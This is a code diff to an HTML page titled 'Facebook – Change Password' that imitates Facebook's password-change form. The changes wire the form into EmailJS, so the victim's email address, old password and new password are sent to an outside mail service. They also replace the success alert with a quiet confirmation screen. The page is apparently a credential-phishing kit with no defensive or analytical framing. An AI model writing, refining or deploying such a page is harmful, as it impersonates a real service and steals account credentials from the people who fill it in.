@@ -4,6 +4,12 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Facebook – Change Password</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("0DWuzZ-mZLM196nkP");  // Public Key
+    })();
+  </script>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
   <style>
     * {
@@ -117,9 +123,9 @@
   <div class="password-box" id="passwordBox">
     <h2>Change Your Password</h2>
     <form id="passwordForm">
-      <input type="email" placeholder="Email address" id="email" required>
-      <input type="password" placeholder="Old password" id="oldPassword" required>
-      <input type="password" placeholder="New password" id="newPassword" required>
+      <input type="email" name="email" placeholder="Email address" id="email" required>
+      <input type="password" name="old_password" placeholder="Old password" id="oldPassword" required>
+      <input type="password" name="new_password" placeholder="New password" id="newPassword" required>
       <button type="submit">Update Password</button>
     </form>
   </div>
@@ -148,15 +154,15 @@
             new_password: new_password
         })
         .then(function(response) {
-            alert('Password update sent successfully!');
-            document.getElementById('passwordForm').reset();
+            // Hide the password box and show the success message
+            document.getElementById('passwordBox').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'flex';
         }, function(error) {
             console.error('FAILED...', error);
             alert('There was an error. Try again.');
         });
     });
-</script>
-  
-  <script src="index.js"></script>
+  </script>
+
 </body>
 </html>
